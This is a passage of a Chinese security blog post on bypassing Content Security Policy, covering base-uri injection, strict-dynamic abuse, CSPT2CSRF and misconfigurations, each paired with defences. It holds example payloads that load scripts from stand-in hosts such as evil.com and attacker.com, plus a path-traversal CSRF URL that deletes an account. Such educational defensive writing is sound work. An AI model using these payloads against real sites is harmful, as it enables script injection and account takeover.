+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 攻击者注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://evil.com/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 页面中的相对路径脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 实际加载 https://evil.com/js/app.js --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-完整攻击链"><a href="#4-2-完整攻击链" class="headerlink" title="4.2 完整攻击链"></a>4.2 完整攻击链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">目标页面：https://victim.com/page?name=test</span><br><span class="line">CSP: script-src &#x27;self&#x27; cdn.example.com   ← 未设置 base-uri</span><br><span class="line">攻击注入：?name=&lt;base href=&quot;https://attacker.com/&quot;&gt;</span><br><span class="line">页面原始：&lt;script src=&quot;/assets/jquery.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">实际请求：https://attacker.com/assets/jquery.js  ← 攻击者控服</span><br></pre></td></tr></table></figure>
+
+<p>只要 <code>attacker.com</code> 命中 script-src 白名单，CSP 就不再阻止。</p>
+<h3 id="4-3-防御"><a href="#4-3-防御" class="headerlink" title="4.3 防御"></a>4.3 防御</h3><p><strong>永远设置 <code>base-uri &#39;self&#39;</code> 或 <code>base-uri &#39;none&#39;</code></strong>——这应该是每个 CSP 的必填项。</p>
+<hr>
+<h2 id="五、strict-dynamic-绕过"><a href="#五、strict-dynamic-绕过" class="headerlink" title="五、strict-dynamic 绕过"></a>五、strict-dynamic 绕过</h2><p><code>strict-dynamic</code> 是 CSP Level 3 特性：被 nonce&#x2F;hash 信任的脚本动态创建的 <code>&lt;script&gt;</code> 自动被信任，无需匹配白名单。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;strict-dynamic&#x27; &#x27;nonce-r4nd0m123&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-1-信任传递链"><a href="#5-1-信任传递链" class="headerlink" title="5.1 信任传递链"></a>5.1 信任传递链</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m123&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  s.<span class="property">src</span> = <span class="string">&#x27;https://cdn.example.com/library.js&#x27;</span>;  <span class="comment">// 自动信任，不在白名单也能加载</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(s);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-攻击面"><a href="#5-2-攻击面" class="headerlink" title="5.2 攻击面"></a>5.2 攻击面</h3><p><code>strict-dynamic</code> 本身不是漏洞，但会放大 DOM XSS 危害——一旦在被信任的脚本中找到注入点，攻击者可通过动态创建 <code>&lt;script&gt;</code> 加载任意外部恶意脚本，<strong>不再受白名单约束</strong>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 被 nonce 信任的脚本中存在注入点</span></span><br><span class="line"><span class="keyword">var</span> redirectUrl = <span class="title function_">getUserInput</span>();  <span class="comment">// ← 用户可控</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者控制 redirectUrl 后：</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">s.<span class="property">src</span> = <span class="string">&#x27;https://evil.com/payload.js&#x27;</span>;  <span class="comment">// strict-dynamic 直接放行</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(s);</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-常见错误配置"><a href="#5-3-常见错误配置" class="headerlink" title="5.3 常见错误配置"></a>5.3 常见错误配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 错误 —— strict-dynamic 没有 nonce/hash 锚点，等于没写</span><br><span class="line">Content-Security-Policy: script-src &#x27;strict-dynamic&#x27; cdn.example.com</span><br><span class="line"></span><br><span class="line"># 正确 —— 至少有一个信任锚</span><br><span class="line">Content-Security-Policy: script-src &#x27;strict-dynamic&#x27; &#x27;nonce-abc123&#x27; cdn.example.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong> 当 <code>strict-dynamic</code> 生效时，<code>&#39;unsafe-inline&#39;</code> 和 <code>http:</code>&#x2F;<code>https:</code> scheme 会被忽略。但静态 <code>&lt;script src=&quot;...&quot;&gt;</code> 仍然会被域名白名单检查。</p>
+<hr>
+<h2 id="六、CSPT2CSRF-技术"><a href="#六、CSPT2CSRF-技术" class="headerlink" title="六、CSPT2CSRF 技术"></a>六、CSPT2CSRF 技术</h2><p><strong>CSPT（Client-Side Path Traversal）</strong> 是指前端 JS 根据用户输入拼接请求路径时产生的路径遍历漏洞。<strong>CSPT2CSRF</strong> 则是利用 CSPT 构造 CSRF 攻击链。</p>
+<h3 id="6-1-CSPT-原理"><a href="#6-1-CSPT-原理" class="headerlink" title="6.1 CSPT 原理"></a>6.1 CSPT 原理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前端代码 —— user ID 取自 URL hash，拼入 API 路径</span></span><br><span class="line"><span class="keyword">var</span> userId = location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/users/&#x27;</span> + userId + <span class="string">&#x27;/profile&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123; <span class="comment">/* 渲染到页面 */</span> &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>攻击者构造 URL：<code>https://victim.com/page#../admin/deleteAccount</code></p>
+<p>实际请求变为：<code>GET /api/users/../admin/deleteAccount/profile</code> → <code>GET /api/admin/deleteAccount/profile</code></p>
+<h3 id="6-2-升级为-CSRF"><a href="#6-2-升级为-CSRF" class="headerlink" title="6.2 升级为 CSRF"></a>6.2 升级为 CSRF</h3><p>当 API 使用 Cookie 鉴权（SameSite&#x3D;None），攻击者可跨域触发：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://victim.com/page#../admin/deleteAccount&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/api/admin/deleteAccount&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-防御"><a href="#6-3-防御" class="headerlink" title="6.3 防御"></a>6.3 防御</h3><p>前端过滤 <code>..</code>、<code>/</code>、<code>\</code>；后端做权限校验；API 使用 CSRF Token；Cookie 设 <code>SameSite=Lax</code>。</p>
+<hr>
+<h2 id="七、CSP-Evaluator-自动化检测"><a href="#七、CSP-Evaluator-自动化检测" class="headerlink" title="七、CSP Evaluator 自动化检测"></a>七、CSP Evaluator 自动化检测</h2><p>手动审查 CSP 容易遗漏。Google 的 <strong>CSP Evaluator</strong>（csp-evaluator.withgoogle.com）是审核 CSP 策略的首选工具。直接粘贴 CSP 头，工具自动给出逐条警告：</p>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>问题</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>🔴 高危</td>
+<td><code>script-src &#39;unsafe-inline&#39;</code></td>
+<td>允许内联脚本，XSS 直通</td>
+</tr>
+<tr>
+<td>🟡 中危</td>
+<td><code>script-src cdn.example.com</code></td>
+<td>白名单域名可能有 JSONP &#x2F; Gadget</td>
+</tr>
+<tr>
+<td>🟡 中危</td>
+<td>缺少 <code>base-uri</code></td>
+<td>可注入 <code>&lt;base&gt;</code> 劫持路径</td>
+</tr>
+<tr>
+<td>🔴 高危</td>
+<td><code>object-src</code> 不为 <code>&#39;none&#39;</code></td>
+<td>插件攻击面</td>
+</tr>
+</tbody></table>
+<p>渗透测试的 CSP 分析流程：提取 CSP → 输入 CSP Evaluator → 标记高危项 → 逐条检查白名单域名（JSONP 列表、云存储、可接管子域名）→ 检查缺失指令（<code>base-uri</code>、<code>object-src</code>）→ 检查 nonce 可预测性 → 构造 payload 验证绕过。</p>
+<hr>
+<h2 id="八、常见配置错误与避坑指南"><a href="#八、常见配置错误与避坑指南" class="headerlink" title="八、常见配置错误与避坑指南"></a>八、常见配置错误与避坑指南</h2><h3 id="8-1-default-src-过宽"><a href="#8-1-default-src-过宽" class="headerlink" title="8.1 default-src 过宽"></a>8.1 default-src 过宽</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 错误 —— 等同于无 CSP</span><br><span class="line">Content-Security-Policy: default-src *</span><br><span class="line"></span><br><span class="line"># 正确 —— 先收紧默认，再逐条放开</span><br><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;nonce-xxx&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-report-uri-不是防御"><a href="#8-2-report-uri-不是防御" class="headerlink" title="8.2 report-uri 不是防御"></a>8.2 report-uri 不是防御</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># report-uri 只报告违规，不阻止执行</span><br><span class="line"># 攻击者 payload 照常执行——report 只是事后日志</span><br><span class="line">Content-Security-Policy: script-src &#x27;self&#x27;; report-uri /csp-report</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-忘记限制-object-src"><a href="#8-3-忘记限制-object-src" class="headerlink" title="8.3 忘记限制 object-src"></a>8.3 忘记限制 object-src</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 即使业务不需要 Flash/插件，object-src 默认继承 default-src</span><br><span class="line"># 始终显式设为 &#x27;none&#x27;</span><br><span class="line">Content-Security-Policy: object-src &#x27;none&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-4-script-src-elem-与-script-src-attr-的覆盖陷阱"><a href="#8-4-script-src-elem-与-script-src-attr-的覆盖陷阱" class="headerlink" title="8.4 script-src-elem 与 script-src-attr 的覆盖陷阱"></a>8.4 script-src-elem 与 script-src-attr 的覆盖陷阱</h3><p>CSP Level 3 拆分了 <code>script-src</code>：<code>script-src-elem</code>（<code>&lt;script&gt;</code> 标签）和 <code>script-src-attr</code>（事件处理器）。后者会覆盖前者对事件处理器的限制：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># script-src 禁止了 unsafe-inline，但 script-src-attr 放开了</span><br><span class="line">Content-Security-Policy: script-src &#x27;self&#x27;; script-src-attr &#x27;unsafe-inline&#x27;</span><br><span class="line"></span><br><span class="line"># 结果：&lt;button onclick=&quot;alert(1)&quot;&gt; 仍可执行！</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-5-同时使用-CSP-和-X-XSS-Protection"><a href="#8-5-同时使用-CSP-和-X-XSS-Protection" class="headerlink" title="8.5 同时使用 CSP 和 X-XSS-Protection"></a>8.5 同时使用 CSP 和 X-XSS-Protection</h3><p><code>X-XSS-Protection: 1; mode=block</code> 已被现代浏览器弃用，可能干扰 CSP 行为——直接去掉。</p>
+<hr>
+<h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>CSP 绕过不是寻找万能 payload，而是<strong>分析每个白名单条目和每个缺失指令的攻击面</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>绕过手法</th>
+<th>前提条件</th>
+<th>核心思路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JSONP 劫持</td>
+<td>白名单中存在 JSONP 端点</td>
+<td>callback 参数注入代码</td>
+</tr>
+<tr>
+<td>CDN Gadget</td>
+<td>白名单包含公共 CDN</td>
+<td>利用已有库的代码执行能力</td>
+</tr>
+<tr>
+<td>子域名接管</td>
+<td>白名单包含通配符域名</td>
+<td>接管过期子域名托管 payload</td>
+</tr>
+<tr>
+<td>Nonce 窃取</td>
+<td>页面存在 DOM XSS</td>
+<td>读取 DOM 中 nonce 创建被信任脚本</td>
+</tr>
+<tr>
+<td>Base-uri 注入</td>
+<td>CSP 未设置 base-uri</td>
+<td><code>&lt;base&gt;</code> 劫持相对路径加载</td>
+</tr>
+<tr>
+<td>strict-dynamic 利用</td>
+<td>被 nonce 信任的脚本有注入点</td>
+<td>动态创建 <code>&lt;script&gt;</code> 绕过白名单</td>
+</tr>
+<tr>
+<td>CSPT2CSRF</td>
+<td>前端路径拼接 + Cookie 认证</td>
+<td>路径遍历构造 CSRF 请求</td>
+</tr>
+</tbody></table>
+<p><strong>推荐的最坚固 CSP 配置：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:</span><br><span class="line">  default-src &#x27;self&#x27;;</span><br><span class="line">  script-src &#x27;strict-dynamic&#x27; &#x27;nonce-&#123;random&#125;&#x27;;</span><br><span class="line">  style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;</span><br><span class="line">  img-src *; connect-src &#x27;self&#x27;;</span><br><span class="line">  frame-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;</span><br><span class="line">  form-action &#x27;self&#x27;; object-src &#x27;none&#x27;;</span><br><span class="line">  report-uri /csp-violation-report</span><br></pre></td></tr></table></figure>
+
+<p>没有 <code>unsafe-inline</code>、没有 <code>unsafe-eval</code>、没有宽松的域名白名单——但即使这样，DOM XSS 结合 <code>strict-dynamic</code> 的信任传递仍是残留风险。CSP 是纵深防御的一环，不能替代输入过滤和输出编码。</p>
+<hr>
+<blockquote>
+<p><strong>再次声明：</strong> 本文技术仅用于合法的安全测试与自有系统的防护加固。未获书面授权对任何系统实施本文所述攻击技术均属违法行为。安全研究者应在授权范围内测试，并遵循负责任的漏洞披露流程。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/XSS-dom-based/" rel="prev" title="DOM型XSS深入分析">
+                  <i class="fa fa-angle-left"></i> DOM型XSS深入分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Intranet-Kerberos-tickets/" rel="next" title="Kerberos攻击：票据伪造">
+                  Kerberos攻击：票据伪造 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
